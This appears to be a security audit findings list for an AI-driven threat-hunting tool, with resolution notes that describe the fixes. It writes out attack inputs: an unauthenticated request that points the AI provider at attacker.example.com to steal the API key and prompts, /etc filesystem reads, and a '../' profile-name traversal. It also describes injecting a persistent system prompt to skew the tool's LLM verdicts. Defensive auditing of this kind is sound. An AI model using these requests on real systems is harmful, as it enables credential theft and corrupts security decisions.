findings.title: Unauthenticated /ai/provider allows base_url override that exfiltrates provider API key and all prompts to attacker URL
findings.evidence: POST /ai/provider {"provider":"openai","base_url":"http://attacker.example.com/v1"} reaches ProviderRegistry.switch() (raven/ai/registry.py); the switch retains the previously-loaded api_key when the request omits one (api_key=api_key or self._config.api_key) and rebuilds the client against the attacker base_url. The next analyze/hypothesis/chat call sends Authorization: Bearer <real-key> plus full prompt content to the attacker host. No auth dependency on the route.
findings.attacker: unauthenticated network client reachable to API port
findings.impact: API key theft, complete prompt/code exfiltration, attacker controls AI responses returned to Raven hunters/orchestrator

findings.title: Unauthenticated /hunt/code and /hunt/variant accept arbitrary repo_path enabling remote filesystem read
findings.evidence: POST /hunt/variant {"repo_path":"/etc"} and POST /hunt/code {"repo_path":"/home"} have no path validation and no auth. variant_analyzer._scan_dangerous_patterns and code_flow_scanner.scan_repository walk repo_path recursively and return findings with file paths plus evidence strings (line content, up to 200 chars per match) drawn from any .py/.c/.cpp/.h file the server process can read. Attacker enumerates filesystem layout, harvests hardcoded secrets and source code outside intended scope.
findings.impact: Arbitrary directory enumeration and partial content disclosure for code files anywhere readable by the server, including hardcoded credentials, private keys in script form, internal source code
findings.resolution_note: Closed in commit 7d0b4f3 (scan_root jail + operator RBAC)

findings.title: Unauthenticated /ai/system-prompt enables persistent prompt injection of all subsequent AI calls
findings.evidence: POST /ai/system-prompt {"prompt":"..."} writes ProviderRegistry.set_system_prompt(prompt) with no auth. After d3d2fbb fix, BaseAIClient._build_messages auto-injects the stored prompt into every provider chat() call whose first message is not already a system role. ModelOrchestrator.chat and any external chat-only consumer are affected. The prompt persists in ProviderConfig and survives profile save/load.
findings.impact: Manipulate AI verdicts in threat hunting, hypothesis generation routed through ModelOrchestrator, and any downstream automation consuming AI output as ground truth
findings.resolution_note: Closed in commit 7d0b4f3 (admin RBAC + audit log)

findings.title: All /ai/* mutation endpoints have no authentication dependency
findings.evidence: Routes /ai/provider POST, /ai/model POST, /ai/system-prompt POST/DELETE, /ai/provider/profiles/{name} POST/PUT/DELETE, /ai/models/load POST, /ai/models/unload POST are declared without Depends(...) auth guards. No global authentication middleware is installed. CORSMiddleware allow_origins=['*'] additionally exposes these to cross-origin browser pivots.
findings.attacker: anyone reachable over network or via a victim browser tab
findings.impact: Enabling primitive for credential exfiltration (base_url swap), prompt injection, model load/unload denial of service, profile poisoning
findings.resolution_note: Closed in commit 7d0b4f3 (require_admin/operator on every mutation)

findings.title: Profile name path traversal in /ai/provider/profiles/{name} writes API keys outside profiles directory
findings.evidence: save_profile(name) builds path as _PROFILES_DIR / f'{name}.json' with no validation. A URL-encoded path-segment value like %2E%2E%2Fpoisoned (..%2Fpoisoned) decodes to '../poisoned'; Path division does not constrain to parent directory and resolves to ~/.raven/poisoned.json. The written JSON contains api_key, base_url, model, and system_prompt. Combined with the unauthenticated PUT /ai/provider/profiles/{name} load endpoint, attacker can persist and activate a fully attacker-controlled provider config.
findings.impact: Write attacker-controlled JSON (containing live API key) to arbitrary location inside ~/.raven; persistence primitive that chains with the base_url exfil finding
findings.resolution_note: Closed in commit 7d0b4f3 (^[A-Za-z0-9_-]{1,64}$ regex + admin RBAC)

findings.title: SSHManager uses paramiko AutoAddPolicy which silently trusts new host keys and enables MITM
findings.evidence: client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) in SSHManager.connect accepts any presented host key without verification. AutomatedInvestigator routes investigation commands through SSHManager.execute_command for hardcoded forensic commands; an on-path attacker can impersonate the investigated host, capture password auth credentials, and return crafted output that misleads HypothesisGenerator and KillChainPlanner LLM verdicts.
findings.attacker: network-position attacker between Raven and the SSH target
findings.input: TCP path during SSH handshake to a host newly added via SSHManager.connect
findings.impact: Credential theft for password-auth flows, command interception, attacker-controlled forensic evidence fed back into LLM-driven hunting decisions

findings.title: VULN-1: Hardcoded JWT default secret allows forged admin tokens in dev/staging
findings.evidence: _DEFAULT_SECRET = 'dev-secret-key-change-in-production' was previously accepted in dev/staging. Any caller with source code access could forge `roles:['admin']` JWTs and bypass all RBAC. Prod-mode validator caught this only when RAVEN_ENVIRONMENT=prod.
findings.attacker: anyone reachable to a dev/staging instance
findings.impact: Full admin RBAC bypass; ability to swap AI provider, change system prompt, invoke OffensiveGodmode, mutate profiles
findings.resolution_note: Added _enforce_secret_key_floor validator that refuses to start in EVERY environment with the default secret, unless RAVEN_ALLOW_INSECURE_DEFAULTS=true is explicitly set (and that flag is itself refused in prod). Tests: tests/test_vuln_fixes.py::TestVuln1SecretKeyFloor (4 tests).

findings.title: VULN-2 (FALSE POSITIVE): /ai/system-prompt does not accept save_path
findings.evidence: The POST /ai/system-prompt handler in raven/api/main.py:729-767 accepts only {prompt: str} or {file: str}. The file parameter only READS (load_system_prompt_from_file -> p.read_text()) and is jailed to CWD via Path.relative_to. There is no save_path, no write path, and no call to .write_text from this endpoint. The single .write_text in the codebase is save_profile in raven/ai/registry.py:172 which uses a regex-validated profile name (^[A-Za-z0-9_-]{1,64}$).
findings.impact: n/a — the described attack surface does not exist
findings.resolution_note: Pinned with tests/test_vuln_fixes.py::TestVuln2NoSavePath to prevent regression introduction.

findings.title: VULN-3: Latent shell-injection in BashExecutor + RemediationEngine + ContainmentActions
findings.evidence: BashExecutor.execute used subprocess.Popen(command, shell=True, ...). RemediationEngine.apply_patch did f'apt-get install -y {patch_id}'. ContainmentActions.terminate_process did f'kill -9 {pid}'. None of these are HTTP-reachable today, but each is a latent injection footgun.
findings.attacker: future caller wiring HTTP input into these helpers
findings.input: shell metacharacters in patch_id / pid / generic command string
findings.impact: Arbitrary OS command execution on Raven host or remote SSH target
findings.resolution_note: BashExecutor.execute now defaults to shell=False with shlex.split parsing; an explicit allow_shell=True flag preserves legacy behaviour but the caller takes responsibility. RemediationEngine validates patch_id against ^[A-Za-z0-9][A-Za-z0-9._+:~=-]{0,127}$ and shlex.quote-wraps before interpolation. ContainmentActions coerces pid to a positive int. Tests: tests/test_vuln_fixes.py::TestVuln3ShellHardening (7 tests including a /tmp/raven_pwned_marker injection canary).

findings.title: VULN-4: Latent pickle/joblib RCE in anomaly + zero-day detectors
findings.evidence: AnomalyDetector.load_model called pickle.load(f). ZeroDayDetector.load_models called joblib.load(path). Neither is API-reachable today, but any future operator-controlled model upload feature would be immediate RCE.
findings.attacker: future caller wiring HTTP input into these load paths
findings.impact: Arbitrary Python code execution at deserialisation time
findings.resolution_note: Added settings.allow_pickle_models flag (default False). Both load paths now refuse deserialisation unless (a) the flag is True AND (b) the resolved path stays under settings.model_path. Tests: tests/test_vuln_fixes.py::TestVuln4PickleGate (4 tests).
